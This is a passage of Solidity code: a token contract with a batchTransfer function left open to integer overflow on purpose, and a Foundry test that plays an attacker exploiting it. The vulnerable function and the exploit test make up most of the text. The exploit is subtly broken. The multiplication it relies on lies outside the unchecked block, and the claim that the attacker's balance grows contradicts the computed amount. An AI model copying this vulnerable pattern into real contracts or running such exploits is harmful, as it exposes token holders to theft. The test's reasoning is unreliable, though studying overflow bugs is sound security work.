        return balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        unchecked {
            balances[msg.sender] -= amount;
            balances[to] += amount;
        }
        return true;
    }

    // Vulnerable batchTransfer with unchecked arithmetic and insufficient overflow checks
    function batchTransfer(address[] memory receivers, uint256 _value) public returns (bool) {
        uint256 cnt = receivers.length;
        require(cnt > 0 && cnt <= 20, "Invalid receivers count");

        // Calculate total amount without overflow check (vulnerable)
        uint256 amount = cnt * _value;

        // Check balance only after multiplication (vulnerable if overflow occurred)
        require(balances[msg.sender] >= amount, "Insufficient balance");

        unchecked {
            // Subtract total amount from sender
            balances[msg.sender] -= amount;

            // Add _value tokens to each receiver
            for (uint256 i = 0; i < cnt; i++) {
                balances[receivers[i]] += _value;
            }
        }

        return true;
    }
}

contract ExploitTest is Test {
    BecToken token;
    address attacker = address(0xBEEF);

    function setUp() public {
        token = new BecToken();
        // Give attacker some initial tokens
        vm.deal(attacker, 1 ether);
        vm.startPrank(token.owner());
        token.transfer(attacker, 1000 * 10**18);
        vm.stopPrank();
    }

    function test_exploit_arithmetic() public {
        vm.startPrank(attacker);

        uint256 cnt = 20;
        uint256 maxUint = type(uint256).max;

        // _value chosen so that cnt * _value overflows uint256
        uint256 _value = (maxUint / cnt) + 1;

        uint256 beforeBalance = token.balanceOf(attacker);

        address[] memory receivers = new address[](cnt);
        for (uint256 i = 0; i < cnt; i++) {
            receivers[i] = address(uint160(i + 1));
        }

        // This call will overflow amount calculation in batchTransfer
        bool success = token.batchTransfer(receivers, _value);

        assertTrue(success, "batchTransfer failed");

        uint256 afterBalance = token.balanceOf(attacker);

        // Because of unchecked subtraction and overflowed amount, attacker balance increased
        assertGt(afterBalance, beforeBalance);

        // One of the receivers got _value tokens
        uint256 receiverBalance = token.balanceOf(receivers[0]);
        assertEq(receiverBalance, _value);

        vm.stopPrank();
    }
}

